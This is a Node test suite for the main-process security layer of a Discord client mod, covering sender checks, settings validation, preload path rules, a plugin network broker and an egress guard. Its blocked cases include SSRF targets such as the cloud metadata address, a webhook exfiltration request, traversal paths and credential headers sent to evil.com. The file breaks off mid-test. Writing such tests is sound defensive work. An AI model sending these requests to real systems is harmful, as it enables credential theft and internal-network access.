/**
 * Security tests for the main-process modules.
 *
 * These exercise the pure/decision logic that does not need an Electron runtime:
 * sender validation, settings validation, the preload-path rules, the rate
 * limiter, and the credential-binding rules. The broker's socket behaviour is
 * covered by the policy tests in `security.test.mjs` plus the manual smoke notes
 * in SECURITY_AUDIT.md.
 *
 * Run: `node --test scripts/tests/security-main.test.mjs`
 */
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import fs from "node:fs";
import { pathToFileURL } from "node:url";
import assert from "node:assert/strict";
import { build } from "esbuild";
import test from "node:test";

const dir = await mkdtemp(path.join(tmpdir(), "dion-secmain-"));

/**
 * `src/main/security/*` imports `electron` and reads `app.getPath`. We stub the
 * module so the decision logic under test loads. Only the pieces the modules
 * actually touch are provided; anything else would be a sign the module is
 * reaching for more than it needs.
 */
/**
 * `src/main/security/*` imports `electron` and reads `app.getPath`. We stub the
 * module so the decision logic under test loads.
 *
 * The stub deliberately **mimics the real early-boot constraint**: `app.isReady()`
 * is false and every `session.*` access throws, exactly as Electron does before
 * the `ready` event. That turns "this module must not touch session before ready"
 * from a comment into an assertion — it is the crash that broke the client on
 * Discord 0.0.413.
 */
const electronStub = `
let ready = true;
let appPath = ${JSON.stringify(dir)};
let userDataPath = ${JSON.stringify(dir)};
const readyCallbacks = [];
function requireReady(what) {
  if (!ready) throw new TypeError(what + " can only be received when app is ready");
}

// Mirror the real thing exactly, because this is the property that decides
// whether the injection can work at all. Measured on Electron 44:
//
//   Object.getOwnPropertyDescriptor(require("electron"), "BrowserWindow")
//   => { get: true, set: false, configurable: false }
//
// A stub with a plain writable property would let an in-place assignment "work"
// and the test would pass for entirely the wrong reason — which is precisely how
// the first attempt at this shipped a no-op patch.
const browserWindowClass = class BrowserWindow { constructor() {} };
export const BrowserWindow = browserWindowClass;
export const screen = {getDisplayMatching:()=>{requireReady("Screen");return {workArea:{x:0,y:0,width:1920,height:1080}};}};
export const webContents = { getAllWebContents: () => [] };
export const desktopCapturer = { getSources: async () => { requireReady("DesktopCapturer"); throw new Error("No capture sources in this policy fixture"); } };
const exportsObject = { app: null };
Object.defineProperty(exportsObject, "BrowserWindow", {
  get: () => browserWindowClass,
  enumerable: true,
  configurable: false,
});

// Every broker request the stub observed, for assertions about what was actually
// sent on each hop.
const brokerFetchLog = [];
export const __brokerLog = () => brokerFetchLog;
export const __brokerLogReset = () => { brokerFetchLog.length = 0; };
export const app = {
  getPath: (which) => (which === "userData" ? userDataPath : ${JSON.stringify(dir)}),
  getAppPath: () => appPath,
  isReady: () => ready,
  whenReady: () => new Promise((resolve) => readyCallbacks.push(() => { ready = true; resolve(); })),
  on() {},
  commandLine: { hasSwitch: () => false },
  exit() {},
  // Test controls. esbuild inlines this module into the test bundle, so the
  // tests must reach these through the bundle's re-export, not by importing
  // this file separately — that would be a second, independent instance.
  __setReady: (v) => { ready = v; },
  __setAppPath: (p) => { appPath = p; },
  __setUserDataPath: (p) => { userDataPath = p; },
  __becomeReady: () => { ready = true; for (const cb of readyCallbacks.splice(0)) cb(); },
};
// Handlers are *recorded*, not swallowed. Four of the findings in this file are
// wiring bugs — a control that is installed correctly but never consulted, or
// consulted with the wrong argument. A stub that discards the registration
// makes those untestable by construction: the test can only reach the primitive,
// never the connection, which is exactly where the bug was.
const ipcHandlers = new Map();
export const ipcMain = {
  handle(channel, fn) { ipcHandlers.set(channel, fn); },
  __handlers: ipcHandlers,
  /** Test control: invoke a registered channel as if the renderer had. */
  __invoke: (channel, event, ...args) => {
    const fn = ipcHandlers.get(channel);
    if (!fn) throw new Error("no handler registered for " + channel);
    return fn(event, ...args);
  },
  __registered: () => [...ipcHandlers.keys()],
};
export const dialog = {showOpenDialog:async()=>{throw Error('Unexpected file dialog in policy test');},showSaveDialog:async()=>{throw Error('Unexpected save dialog in policy test');}};
export const shell = { openExternal: async () => {} };
// Snapshot copies land here; the test reads them back through the bundle.
const clipboardWrites = [];
export class ClipboardItem { constructor(items) { this.items = items; } }
export const clipboard = { write: async (items) => { clipboardWrites.push(items); }, __writes: clipboardWrites };
export const session = {
  // Memoized, because Electron returns the *same* session object every time and
  // several code paths compare by identity.
  _default: null,
  get defaultSession() {
    requireReady("Session");
    if (this._default === null) this._default = {
      webRequest: {
        onBeforeRequest() {},
        // The egress guard must install on onBeforeSendHeaders. Measured on the
        // real binary: onBeforeRequest details carry no headers at all, so a
        // guard installed there sees every request as credential-free and the
        // only main-process network enforcement in the product is a no-op.
        // (No backticks in this comment: the stub is a template literal.)
        onBeforeSendHeaders(filter, fn) { this._sendHeaders = fn; this._sendFilter = filter; },
        _sendHeaders: null,
        _sendFilter: null,
      },
      _requestHandler: null,
      _checkHandler: null,
      setPermissionRequestHandler(fn) { this._requestHandler = fn; },
      setPermissionCheckHandler(fn) { this._checkHandler = fn; },
    };
    return this._default;
  },
  // The broker partition's fetch is programmable so a redirect chain can be
  // replayed. The default answers 599 (an error status) so a test that forgets
  // to install a script sees a failure rather than a silent success.
  fromPartition: () => {
    requireReady("Session");
    return {
      setPermissionRequestHandler() {},
      setPermissionCheckHandler() {},
      fetch: async (url, init) => {
        brokerFetchLog.push({ url: String(url), method: init?.method, headers: { ...(init?.headers ?? {}) } });
        if (typeof globalThis.__brokerFetch === "function") return globalThis.__brokerFetch(String(url), init);
        return new Response("", { status: 599 });
      },
    };
  },
};
export const net = { fetch: async () => new Response("", { status: 599 }) };
export const safeStorage = { isEncryptionAvailable: () => false, encryptString: () => undefined, decryptString: () => undefined };
export default { app, ipcMain, session, net, shell, safeStorage };
`;

// The stub must exist on disk before esbuild resolves the alias.
const electronStubPath = path.join(dir, "electron-stub.mjs");
await fs.promises.writeFile(electronStubPath, electronStub);

await build({
  stdin: {
    contents: `
      export { describeSender, assertTrustedSender, securityLog, SyncordSettingsFile } from './src/main/security/core';
      export { validateSettingsPayload, isReservedSettingsKey, writeSettings, readSettings, SETTINGS_LIMITS } from './src/main/security/settings';
      export { validateOriginalPreload, allowedPreloadBases } from './src/main/security/originalPreload';
      export { consumeLimit, resetLimits, RATE_LIMITS, trackedBucketCount } from './src/main/security/rateLimit';
      export { applyCredentials, loadCredentials, clearCredentials, describeSecrets } from './src/main/security/credentials';
      export { resetLimits as __resetLimits2 } from './src/main/security/rateLimit';
      export { registerPluginManifest, brokerRequest, setNetworkLockdown } from './src/main/security/networkBroker';
      export { grantPermission, revokePermission, listGrants, loadGrants, clearSessionGrants, grantedNetworkPermissions, PERMISSION_CATEGORIES } from './src/main/security/permissionStore';
      export { decideEgress, installSessionGuards, watchForNewContents, egressGuardActive, egressSuppressionCount, attachSession } from './src/main/security/session';
      export { judgePopup, describeWindowPolicy, installWindowGuards } from './src/main/security/navigation';
      export { decidePermission, describePermissionPolicy, installPermissionHandlers, permissionHandlersActive } from './src/main/security/permissions';
      export { isSafeMode, isLockdown, isCorePlugin, corePluginIds, enableSafeMode, enableLockdown, exitSafeMode } from './src/main/security/modes';
      export { isNetworkLockedDown, blockPluginNetwork, registeredPluginIds, isNetworkBlockedFor } from './src/main/security/networkBroker';
      export { onAppReady, tryInstall } from './src/main/security/core';
      export { verifyIntegrity, integrityStatus } from './src/main/security/integrity';
      export { validateDiscordPreloadPath } from './src/security/paths';
      export { validateNetworkHost as __validateNetworkHost } from './src/security/permissions';
      export { installEgressGuard } from './src/main/security/session';
      export { app as electronApp, ipcMain as __ipcMain, session as __electronSession, __brokerLog, __brokerLogReset, clipboard as __clipboard } from 'electron';
      export { registerIpc } from './src/main/ipc';
    `,
    resolveDir: process.cwd(),
    loader: "ts",
  },
  bundle: true,
  platform: "node",
  format: "esm",
  outfile: path.join(dir, "main.mjs"),
  external: ["electron"],
  alias: { electron: electronStubPath },
  logLevel: "warning",
});

/**
 * The bundles are emitted as ESM but reference `__dirname`, a CJS global that
 * Electron's loader supplies. Define it so `integrity.ts` — which resolves its
 * bundle directory from it — can be exercised; point it at a directory with no
 * manifest, which is the "unreadable" path the test asserts on.
 */
globalThis.__dirname = dir;

const M = await import(pathToFileURL(path.join(dir, "main.mjs")).href);

/**
 * The stubbed `app`, reached through the bundle. esbuild inlines the electron
 * stub into `main.mjs`, so importing the stub file separately would give a
 * second instance with its own readiness state — and the test would pass for
 * the wrong reason.
 */
const EB = { app: M.electronApp };

/** Minimal IpcMainInvokeEvent stand-in. */
function makeEvent({ url, isMainFrame = true, hasSender = true, hasFrame = true }) {
  const frame = hasFrame ? { url } : null;
  const mainFrame = isMainFrame ? frame : { url: "https://discord.com" };
  return {
    sender: hasSender ? { id: 7, mainFrame } : undefined,
    senderFrame: frame,
  };
}

// ── PHASE 2 / 30: IPC sender validation ──────────────────────────────────────

test("sender validation: the Discord main frame is trusted", () => {
  const d = M.describeSender(makeEvent({ url: "https://discord.com/app" }), "CH");
  assert.equal(d.trusted, true);
  assert.equal(d.webContentsId, 7);
  assert.equal(d.origin, "https://discord.com");
});

test("sender validation: untrusted origins are refused", () => {
  const hostile = [
    "https://discord.com.evil.com/app",
    "https://evil.com/",
    "http://discord.com/",
    "data:text/html,<script>1</script>",
    "file:///etc/passwd",
    "blob:https://discord.com/1234",
    "about:blank",
    "",
  ];
  for (const url of hostile) {
    const d = M.describeSender(makeEvent({ url }), "CH");
    assert.equal(d.trusted, false, `${url || "<empty>"} must not be trusted`);
  }
});

test("sender validation: subframes, missing senders and missing frames are refused", () => {
  assert.equal(M.describeSender(makeEvent({ url: "https://discord.com", isMainFrame: false })).trusted, false);
  assert.equal(M.describeSender(makeEvent({ url: "https://discord.com", hasSender: false })).trusted, false);
  assert.equal(M.describeSender(makeEvent({ url: "https://discord.com", hasFrame: false })).trusted, false);
});

test("sender validation: refusal throws and records an IPC_BLOCKED event", () => {
  const log = M.securityLog();
  log.clear();
  assert.throws(
    () => M.assertTrustedSender(makeEvent({ url: "https://evil.com" }), "Syncord_TEST"),
    /Untrusted IPC sender/,
  );
  const events = log.byType("IPC_BLOCKED");
  assert.equal(events.length, 1);
  assert.equal(events[0].channel, "Syncord_TEST");
  assert.equal(events[0].origin, "https://evil.com");
  assert.equal(events[0].webContentsId, 7);
  // The reason must be a short classification, never the URL itself.
  assert.ok(!String(events[0].reason).includes("evil.com"), "reason must not echo the origin");
});

// ── PHASE 2 / R7: settings payload validation ────────────────────────────────

test("settings: non-objects are rejected", () => {
  for (const bad of [null, undefined, 42, "x", [], true]) {
    assert.equal(M.validateSettingsPayload(bad).ok, false, `${JSON.stringify(bad)} must be rejected`);
  }
});

test("settings: the reserved security namespace is stripped, not written", () => {
  const v = M.validateSettingsPayload({
    theme: "dark",
    security: { lockdown: false },
    safeMode: false,
    developerMode: true,
    "security.devTools": true,
    plugins: { hello: { enabled: false } },
  });
  assert.equal(v.ok, true);
  assert.equal(v.data.theme, "dark");
  assert.deepEqual(v.data.plugins, { hello: { enabled: false } });
  // A plugin must not be able to disable the guards by writing settings.
  assert.equal("security" in v.data, false);
  assert.equal("safeMode" in v.data, false);
  assert.equal("developerMode" in v.data, false);
  assert.ok(!Object.keys(v.data).some((k) => k.startsWith("security.")));
});

test("settings: size, depth and type limits are enforced", () => {
  /** @type {Record<string, unknown>} */
  const deep = {};
  let cursor = deep;
  for (let i = 0; i < 20; i++) {
    const next = {};
    cursor.n = next;
    cursor = next;
  }
  assert.equal(M.validateSettingsPayload(deep).ok, false, "too deep");

  assert.equal(M.validateSettingsPayload({ n: Number.NaN }).ok, false);
  assert.equal(M.validateSettingsPayload({ n: Number.POSITIVE_INFINITY }).ok, false);
  assert.equal(M.validateSettingsPayload({ s: "x".repeat(M.SETTINGS_LIMITS.maxStringLength + 1) }).ok, false);
  assert.equal(M.validateSettingsPayload({ a: new Array(M.SETTINGS_LIMITS.maxArrayItems + 1).fill(1) }).ok, false);
  assert.equal(M.validateSettingsPayload({ f: () => 1 }).ok, false);
  assert.equal(M.validateSettingsPayload({ ok: { a: 1, b: "two", c: true, d: null } }).ok, true);
});

test("settings: writes are bounded and round-trip", () => {
  const big = {};
  for (let i = 0; i < 40000; i++) big[`k${i}`] = "v".repeat(20);
  assert.equal(M.writeSettings(big).ok, false, "oversized payloads must be refused");

  assert.equal(M.writeSettings({ theme: "midnight", n: 3 }).ok, true);
  const load = M.readSettings();
  assert.equal(load.ok, true);
  assert.equal(load.data.theme, "midnight");
  // Under the user-data path Electron reports, in a Syncord subdirectory —
  // asserted against the source of truth rather than a hardcoded temp dir,
  // because another test in this file moves that path.
  const userData = EB.app.getPath("userData");
  assert.equal(
    M.SyncordSettingsFile(),
    path.join(userData, "Syncord", "settings.json"),
    "settings must live under the Syncord profile inside Discord's user data",
  );
});

// ── PHASE 1 / 19 / 30: original preload path ─────────────────────────────────

/**
 * Build a fake Discord install.
 *
 * The layout mirrors **Discord 0.0.413**, not the older `app/bootstrap/load.js`
 * shape the first draft of the rule assumed: the asar holds only `bundle.js` and
 * `splashScreenPreload.js`, and the window preload is resolved by Electron from
 * the app path. The old rule rejected that layout, which is the second bug this
 * file now guards.
 */
function makeFakeDiscord() {
  const base = fs.mkdtempSync(path.join(tmpdir(), "dion-res-"));
  const resources = path.join(base, "Contents", "Resources");
  const appDir = path.join(resources, "app"); // Syncord's injected dir
  const asar = path.join(resources, "_app.asar");
  const bootstrap = path.join(base, "Contents", "Resources", "bootstrap");
  for (const dir of [appDir, asar, bootstrap]) fs.mkdirSync(dir, { recursive: true });

  fs.writeFileSync(path.join(asar, "bundle.js"), "module.exports = 2;");
  fs.writeFileSync(path.join(bootstrap, "load.js"), "module.exports = 1;");
  fs.writeFileSync(path.join(asar, "splashScreenPreload.js"), "module.exports = 3;");
  fs.writeFileSync(path.join(appDir, "preload.js"), "// ours");

  // A hostile file outside the tree, and a symlink pointing at it.
  const outside = path.join(base, "evil.js");
  fs.writeFileSync(outside, "module.exports = 'pwned';");
  fs.symlinkSync(outside, path.join(bootstrap, "evil-link.js"));
  fs.symlinkSync(outside, path.join(asar, "evil-link.js"));

  return {
    base,
    resources,
    appDir,
    good: path.join(bootstrap, "load.js"),
    asarSplash: path.join(asar, "splashScreenPreload.js"),
    asarLink: path.join(asar, "evil-link.js"),
    link: path.join(bootstrap, "evil-link.js"),
    outside,
  };
}

const fake = makeFakeDiscord();
// Point the stubbed Electron at the fake install, the way it would be pointed at
// the real one: `getAppPath()` is whatever app.setAppPath() resolved to.
EB.app.__setAppPath(fake.resources);

// ── The Discord 0.0.413 shape: the main screen's preload is NOT in the bundle ──
//
// Measured from the boot log on a real install:
//   ~/Library/Application Support/discord/app-0.0.413/modules/
//     discord_desktop_core-1/discord_desktop_core/core.asar/mainScreenPreload.js
//
// Discord keeps its host and downloaded modules under the user-data directory,
// so a containment rule anchored only on the app bundle refuses the main window
// and the client silently stays stock Discord.
const moduleRoot = path.join(fake.base, "userData");
const moduleDir = path.join(moduleRoot, "app-0.0.413", "modules", "discord_desktop_core-1", "discord_desktop_core");
fs.mkdirSync(moduleDir, { recursive: true });
const mainScreenPreload = path.join(moduleDir, "core.asar", "mainScreenPreload.js");
// The asar is a *file*; the preload "inside" it does not exist on disk, which is
// exactly the case that broke realpath-based containment.
fs.writeFileSync(path.join(moduleDir, "core.asar"), "asar-placeholder");
EB.app.__setUserDataPath(moduleRoot);

test("preload path: legitimate Discord preloads inside the app path are accepted", () => {
  // The app path Electron reports is the asar; resources is the parent tree.
  // Both are legitimate bases, and both must work.
  for (const candidate of [fake.good, fake.asarSplash]) {
    const v = M.validateOriginalPreload(candidate);
    assert.equal(v.ok, true, `${candidate}: ${v.ok ? "" : v.reason}`);
  }
});

test("preload path: a preload path from a real Discord install shape is accepted", () => {
  // The regression that broke loading: the older `app/bootstrap/load.js` shape
  // and the 0.0.413 `bootstrap/load.js` shape must BOTH pass.
  const legacy = path.join(fake.base, "Contents", "Resources", "_app.asar", "app", "bootstrap");
  fs.mkdirSync(legacy, { recursive: true });
  const legacyLoad = path.join(legacy, "load.js");
  fs.writeFileSync(legacyLoad, "module.exports = 1;");
  const v = M.validateOriginalPreload(legacyLoad);
  assert.equal(v.ok, true, `legacy app/bootstrap/load.js: ${v.ok ? "" : v.reason}`);
});

test("preload path: hostile inputs are refused", () => {
  const cases = [
    [fake.link, "symlink escaping the bundle"],
    [fake.asarLink, "symlink escaping the asar"],
    [fake.outside, "outside the app tree entirely"],
    [fake.appDir + "/preload.js", "our own injected preload"],
    ["relative/load.js", "not absolute"],
    ["/tmp/load.js", "not in the app tree"],
    [fake.resources + "/load.json", "not a .js file"],
    [fake.resources + "/load", "no extension"],
    [`${fake.good}\u0000.txt`, "NUL truncation"],
    [fake.resources + "/../evil/load.js", "traversal"],
    ["", "empty"],
    [null, "null"],
    [42, "number"],
  ];
  for (const [candidate, label] of cases) {
    const v = M.validateOriginalPreload(candidate);
    assert.equal(v.ok, false, `${label} must be refused (${JSON.stringify(candidate)})`);
  }
});

test("preload path: Discord 0.0.413's main-screen preload inside userData is accepted", () => {
  // The regression from the real boot log. Rejecting this path is what produced
  // "Discord opens, Syncord does not load", with no error anywhere.
  const v = M.validateOriginalPreload(mainScreenPreload);
  assert.equal(
    v.ok,
    true,
    `the main screen preload must be accepted: ${v.ok ? "" : v.reason}`,
  );
  assert.equal(v.basename, "mainScreenPreload");
});

test("preload path: the userData base does not open the door to the rest of the disk", () => {
  // Adding userData to the allowed bases must not turn into "any path on the
  // machine is a valid preload".
  const outsideUserData = [
    path.join(fake.base, "elsewhere", "mainScreenPreload.js"),
    path.join(fake.base, "userData", "..", "elsewhere", "load.js"),
    "/tmp/mainScreenPreload.js",
    "/Users/someone/mainScreenPreload.js",
  ];
  for (const candidate of outsideUserData) {
    const v = M.validateOriginalPreload(candidate);
    assert.equal(v.ok, false, `${candidate} must be refused`);
  }

  // A non-JavaScript file inside userData is still refused.
  const data = path.join(moduleRoot, "app-0.0.413", "payload.json");
  fs.writeFileSync(data, "{}");
  assert.equal(M.validateOriginalPreload(data).ok, false);
});

test("preload path: an unrecognised name inside the app path is accepted but reported", () => {
  // The regression that broke the client on 0.0.413: `bundle.js` was refused by
  // the name allowlist, so Syncord silently stopped loading. A name list is
  // not a security boundary here, and being wrong about it costs availability.
  const odd = path.join(fake.resources, "bundle.js");
  fs.writeFileSync(odd, "module.exports = 9;");
  const v = M.validateOriginalPreload(odd);
  assert.equal(v.ok, true, "an unrecognised name inside the app path must be accepted");
  assert.equal(v.basename, "bundle");
  assert.equal(v.knownName, false, "and it must be reported as unrecognised");
});

test("preload path: our own bundle can never be loaded as Discord's preload", () => {
  // The self-reference check keys off the resources path, so exercise it with a
  // base that looks like one.
  const verdict = M.validateDiscordPreloadPath(path.join(fake.appDir, "preload.js"), {
    allowedBases: [fake.resources],
    realpath: (t) => {
      try {
        return fs.realpathSync(t);
      } catch {
        return path.resolve(t);
      }
    },
  });
  assert.equal(verdict.ok, false, "resources/app/preload.js must never be accepted");
});

// ── REGRESSION: nothing may touch `session` before the app is ready ──────────

test("regression: session guards install safely before the app is ready", async () => {
  // This is the exact crash that stopped Discord from starting on 0.0.413:
  //   TypeError: Session can only be received when app is ready
  //   at installEgressGuard (main.js)
  // The electron stub throws on any session access until the app is ready, so
  // calling the installers through their safe entry point must not throw.
  EB.app.__setReady(false);
  try {
    assert.doesNotThrow(() => M.installSessionGuards(), "installSessionGuards must not throw before ready");
    assert.doesNotThrow(() => M.watchForNewContents(), "watchForNewContents must not throw before ready");
    assert.doesNotThrow(() => M.onAppReady(() => {}), "onAppReady must not throw before ready");
    assert.doesNotThrow(() => M.egressGuardActive(), "the status probe must not throw before ready");
    assert.doesNotThrow(() => M.permissionHandlersActive());

    // The raw primitives must still fail loudly — the deferral is the fix, not
    // the swallowing of the error.
    assert.throws(() => M.installEgressGuard(), /can only be received when app is ready/);
    assert.throws(() => M.installPermissionHandlers(), /can only be received when app is ready/);
  } finally {
    EB.app.__becomeReady();
  }

  // Once ready, the deferred install must actually happen.
  await new Promise((resolve) => setImmediate(resolve));
  assert.doesNotThrow(() => M.installSessionGuards());
  assert.equal(M.egressGuardActive(), true, "the guard must be installed after ready");
  assert.equal(M.permissionHandlersActive(), true, "permission handlers must be installed after ready");
});

test("regression: onAppReady runs its callback once the app becomes ready", async () => {
  EB.app.__setReady(false);
  let ran = false;
  M.onAppReady(() => {
    ran = true;
  });
  assert.equal(ran, false, "must not run before ready");
  EB.app.__becomeReady();
  await new Promise((resolve) => setImmediate(resolve));
  assert.equal(ran, true, "must run after ready");
});

test("regression: tryInstall swallows a failing install instead of killing the client", () => {
  // A security layer that stops Discord from booting is not a security layer.
  let installed = false;
  const ok = M.tryInstall("deliberate-failure", () => {
    throw new Error("simulated Electron API change");
  });
  assert.equal(ok, false);
  assert.equal(installed, false);

  const ok2 = M.tryInstall("deliberate-success", () => {
    installed = true;
  });
  assert.equal(ok2, true);
  assert.equal(installed, true);
});

// ── PHASE 17: rate limiting ──────────────────────────────────────────────────

test("rate limiting: burst then cooldown", () => {
  M.resetLimits();
  const rule = M.RATE_LIMITS.network;
  let allowed = 0;
  for (let i = 0; i < rule.burst + 20; i++) {
    if (M.consumeLimit("p1", "network").allowed) allowed++;
  }
  assert.equal(allowed, rule.burst, "exactly the burst is allowed before the limiter trips");
  const denied = M.consumeLimit("p1", "network");
  assert.equal(denied.allowed, false);
  assert.ok(denied.retryAfterMs > 0, "a cooldown is reported");
});

test("rate limiting: buckets are per key, so one plugin cannot starve another", () => {
  M.resetLimits();
  for (let i = 0; i < M.RATE_LIMITS.network.burst + 5; i++) M.consumeLimit("noisy", "network");
  assert.equal(M.consumeLimit("noisy", "network").allowed, false);
  assert.equal(M.consumeLimit("quiet", "network").allowed, true);
});

// ── PHASE 3 / 15: broker credentials ─────────────────────────────────────────

test("credentials: nothing is attached while no binding is configured", () => {
  // No first-party integration is registered, so the broker must not invent a
  // credential for any host — not even for a host a plugin names.
  clearAndLoad({ ANY_SECRET_AT_ALL: "s3cret-value" });
  const out = M.applyCredentials("api.example.com", "POST", { "Content-Type": "application/json" });
  assert.equal(out["x-api-key"], undefined, "an unbound env var must never become a header");
  assert.equal(out["Content-Type"], "application/json", "the caller's own headers survive");
  // The input object is not mutated.
  const input = { "Content-Type": "application/json" };
  M.applyCredentials("api.example.com", "POST", input);
  assert.deepEqual(input, { "Content-Type": "application/json" });
  // Names only, and none configured.
  assert.deepEqual(M.describeSecrets(), []);
  clearAndLoad({});
});

function clearAndLoad(env) {
  M.clearCredentials();
  M.loadCredentials(env);
}

// ── PHASE 3 / 9: broker manifest + identity ──────────────────────────────────

test("manifest: unknown and malformed plugin entries are refused", () => {
  const r = M.registerPluginManifest([
    { id: "good", network: [{ host: "api.example.com", methods: ["GET"] }] },
    { id: "Bad_ID", network: [] },
    { id: "wildcard", network: [{ host: "*" }] },
    "not an object",
    { network: [] },
  ]);
  assert.equal(r.accepted, 1);
  assert.equal(r.rejected.length, 4);
});

test("broker: an unregistered plugin id is denied even with a valid-looking request", async () => {
  M.setNetworkLockdown(false);
  const res = await M.brokerRequest({
    pluginId: "does-not-exist",
    url: "https://evil.com/steal",
    method: "POST",
    body: "x",
  });
  assert.equal(res.ok, false);
  assert.match(res.blockedReason, /not registered/);
});

test("broker: lockdown denies a registered plugin too", async () => {
  M.registerPluginManifest([{ id: "p", network: [{ host: "api.example.com", methods: ["GET"] }] }]);
  M.setNetworkLockdown(true, "test");
  const res = await M.brokerRequest({ pluginId: "p", url: "https://api.example.com/", method: "GET" });
  assert.equal(res.ok, false);
  assert.match(res.blockedReason, /lockdown/i);
  M.setNetworkLockdown(false);
});

test("broker: registered plugin without a matching host is denied by policy", async () => {
  M.registerPluginManifest([{ id: "p", network: [{ host: "api.example.com", methods: ["GET"] }] }]);
  const res = await M.brokerRequest({ pluginId: "p", url: "https://elsewhere.example/", method: "GET" });
  assert.equal(res.ok, false);
  assert.match(res.blockedReason, /no network permission/);
});

test("broker: SSRF attempts are refused before any socket is opened", async () => {
  M.registerPluginManifest([{ id: "ssrf", network: [{ host: "127.0.0.1" }, { host: "169.254.169.254" }] }]);
  for (const url of ["https://127.0.0.1:8080/", "https://169.254.169.254/latest/meta-data/"]) {
    const res = await M.brokerRequest({ pluginId: "ssrf", url, method: "GET" });
    assert.equal(res.ok, false, `${url} must be refused`);
    assert.match(res.blockedReason, /loopback|private|reserved/);
  }
});

test("broker: webhook exfiltration is blocked without the dedicated permission", async () => {
  M.registerPluginManifest([{ id: "hooker", network: [{ host: "discord.com", methods: ["POST"] }] }]);
  const res = await M.brokerRequest({
    pluginId: "hooker",
    url: "https://discord.com/api/webhooks/1/tok",
    method: "POST",
    body: '{"content":"stolen"}',
  });
  assert.equal(res.ok, false);
  assert.match(res.blockedReason, /webhook/i);

  // ...and allowed once the manifest explicitly grants it.
  M.registerPluginManifest([
    { id: "hooker", network: [{ host: "discord.com", methods: ["POST"] }], webhookSend: true },
  ]);
  const allowed = await M.brokerRequest({
    pluginId: "hooker",
    url: "https://discord.com/api/webhooks/1/tok",
    method: "POST",
    body: "{}",
  });
  // The stub session returns status 599, so this exercises the allow path
  // (it gets a response, not a policy denial).
  assert.equal(allowed.blockedReason, undefined);
});

test("broker: non-object and identity-less requests are refused", async () => {
  for (const bad of [null, undefined, 42, "x", []]) {
    const res = await M.brokerRequest(bad);
    assert.equal(res.ok, false);
  }
  const res = await M.brokerRequest({ url: "https://api.example.com/", method: "GET" });
  assert.equal(res.ok, false);
  assert.match(res.blockedReason, /identity/);
});

// ── PHASE 4 / 30: host permission manager ────────────────────────────────────

test("permissions: default deny — nothing is granted until the user says so", () => {
  M.clearSessionGrants();
  for (const g of M.listGrants()) M.revokePermission(g.key);
  assert.equal(M.listGrants().length, 0);
  assert.deepEqual(M.grantedNetworkPermissions("anything"), []);
});

test("permissions: only the five grantable categories exist, and script is not one", () => {
  assert.deepEqual([...M.PERMISSION_CATEGORIES].sort(), [
    "font",
    "image",
    "media",
    "network-connect",
    "style",
  ]);
  assert.equal(M.PERMISSION_CATEGORIES.includes("script"), false);
  const r = M.grantPermission({ pluginId: "p", category: "script", host: "evil.com" });
  assert.equal(r.ok, false);
});

test("permissions: a network grant becomes an effective broker permission", async () => {
  M.registerPluginManifest([{ id: "p4", network: [] }]);
  const before = await brokerRequest("https://api.example.com/x");
  assert.equal(before.ok, false, "no permission yet");
  assert.match(before.blockedReason, /no network permission/);

  const g = M.grantPermission({
    pluginId: "p4",
    category: "network-connect",
    host: "api.example.com",
    methods: ["get"],
    trusted: false,
  });
  assert.equal(g.ok, true);
  assert.deepEqual(g.grant.methods, ["GET"], "methods are normalized to uppercase");
  assert.deepEqual(M.grantedNetworkPermissions("p4"), [
    { host: "api.example.com", methods: ["GET"] },
  ]);

  // The grant is now the effective policy, so the same request is no longer
  // refused for lack of a permission.
  const after = await brokerRequest();
  assert.equal(after.blockedReason, undefined, `unexpected denial: ${after.blockedReason}`);
});

test("permissions: an image grant does not imply connect-src", () => {
  M.grantPermission({ pluginId: "pimg", category: "image", host: "cdn.example.com", trusted: false });
  assert.deepEqual(
    M.grantedNetworkPermissions("pimg"),
    [],
    "only network-connect grants reach the broker",
  );
  assert.equal(M.listGrants("pimg").length, 1, "the grant is still recorded and visible in settings");
});

test("permissions: session grants are not persisted, trusted ones are", () => {
  M.grantPermission({ pluginId: "psess", category: "network-connect", host: "one.example", trusted: false });
  M.grantPermission({ pluginId: "psess", category: "network-connect", host: "two.example", trusted: true });
  M.clearSessionGrants();
  const hosts = M.listGrants("psess").map((g) => g.host).sort();
  assert.deepEqual(hosts, ["two.example"], "only the explicitly trusted grant survives");
});

test("permissions: malformed requests are rejected", () => {
  for (const bad of [
    { pluginId: "p", category: "network-connect", host: "*" },
    { pluginId: "p", category: "network-connect", host: "a..b" },
    { pluginId: "P_bad", category: "network-connect", host: "a.com" },
    { pluginId: "p", category: "network-connect", host: "" },
    { pluginId: "p", category: "bogus", host: "a.com" },
  ]) {
    assert.equal(M.grantPermission(bad).ok, false, `${JSON.stringify(bad)} must be refused`);
  }
});

test("permissions: revoking removes the effective permission", () => {
  const g = M.grantPermission({
    pluginId: "prevoke",
    category: "network-connect",
    host: "gone.example",
    trusted: false,
  });
  assert.equal(g.ok, true);
  assert.equal(M.grantedNetworkPermissions("prevoke").length, 1);
  assert.equal(M.revokePermission(g.grant.key), true);
  assert.equal(M.grantedNetworkPermissions("prevoke").length, 0);
  assert.equal(M.revokePermission("nope::nope::nope"), false);
  assert.equal(M.revokePermission(null), false);
});

// ── PHASE 5 / 30: session-layer egress guard (the real enforcement) ─────────

test("egress: Discord's own credentialed traffic is untouched", () => {
  // These are the requests that must keep working, or the client is broken.
  for (const url of [
    "https://discord.com/api/v9/users/@me",
    "https://canary.discord.com/api/v9/users/@me",
    "https://discordapp.com/api/v9/guilds",
    "https://cdn.discordapp.com/avatars/1/2.png",
    "https://media.discordapp.net/attachments/1/2.mp4",
  ]) {
    const d = M.decideEgress(url, { Authorization: "Bot abc", Cookie: "token=xyz" });
    assert.equal(d.allow, true, `${url} must not be blocked`);
  }
  // Discord's authenticated upload path goes to cdn.discordapp.com; blocking it
  // would break attachments, and a credential reaching a Discord-operated
  // bucket is not exfiltration.
  assert.equal(M.decideEgress("https://cdn.discordapp.com/attachments/x", { Authorization: "Bot abc" }).allow, true);
});

test("egress: a credential aimed at a third party is blocked", () => {
  const cases = [
    ["https://evil.com/collect", { Authorization: "Bot abc" }],
    ["https://evil.com/collect", { Cookie: "__dcfduid=abc; token=secret" }],
    ["https://evil.com/collect", { "X-Auth-Token": "abc" }],
    ["https://evil.com/collect", { "Proxy-Authorization": "Basic abc" }],
    // Header names are matched case-insensitively.
    ["https://evil.com/collect", { AUTHORIZATION: "Bot abc" }],
    // Array-valued headers (Chromium sometimes groups these) must be handled.
    ["https://evil.com/collect", { Cookie: ["a=1", "b=2"] }],
